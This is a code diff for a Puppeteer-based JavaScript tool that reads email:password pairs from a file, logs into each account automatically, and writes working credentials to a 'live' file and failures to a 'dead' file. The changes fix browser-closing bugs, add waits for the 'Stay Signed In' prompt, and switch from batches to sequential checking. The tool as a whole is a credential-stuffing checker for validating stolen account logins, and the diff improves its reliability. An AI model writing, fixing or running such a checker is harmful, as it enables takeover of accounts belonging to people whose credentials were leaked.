@@ -105,8 +105,7 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
             const errorMsg = await page.$eval(EMAIL_ERROR_SELECTOR, el => el.textContent);
             console.log(chalk.red(`❌ Email error: ${errorMsg}`));
             deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
-            await browser.close();
-            return;
+            return; // Skip to the next iteration without closing the browser prematurely
         }
 
         // Step 3: Fill in password and check for errors
@@ -122,12 +121,13 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
             const errorMsg = await page.$eval(PASSWORD_ERROR_SELECTOR, el => el.textContent);
             console.log(chalk.red(`❌ Password error: ${errorMsg}`));
             deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
-            await browser.close();
-            return;
+            return; // Skip to the next iteration without closing the browser prematurely
         }
 
         // Step 4: Handle "Stay Signed In?" prompt
+        await page.waitForSelector(STAY_SIGNED_IN_SELECTOR);
         await page.click(STAY_SIGNED_IN_SELECTOR);
+        await page.waitForNavigation({ waitUntil: 'networkidle2' });
         console.log(chalk.green(`✅ Login successful for: ${email}`));
 
         // Step 5: Proceed with email filtering
@@ -173,8 +173,8 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
         console.error(`Login failed for ${email}:`, error);
         deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
     } finally {
-        await page.close();
-        await browser.close();
+        await page.close(); // Close page after all checks are done
+        await browser.close(); // Close browser after all checks are done
     }
 
     stats.checked++;
@@ -223,13 +223,18 @@ async function processFile(inputFile, filters) {
 
     statusInterval = setInterval(updateStatus, 1000);
 
-    const batchSize = 1;
-    for (let i = 0; i < lines.length; i += batchSize) {
-        const batch = lines.slice(i, i + batchSize);
-        await Promise.all(batch.map(line => {
-            const [email, password] = line.split(':');
-            return checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter);
-        }));
+    // const batchSize = 1;
+    // for (let i = 0; i < lines.length; i += batchSize) {
+    //     const batch = lines.slice(i, i + batchSize);
+    //     await Promise.all(batch.map(line => {
+    //         const [email, password] = line.split(':');
+    //         return checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter);
+    //     }));
+    // }
+
+    for (let line of lines) {
+        const [email, password] = line.split(':');
+        await checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter); // Process emails sequentially
     }
 
     clearInterval(statusInterval);
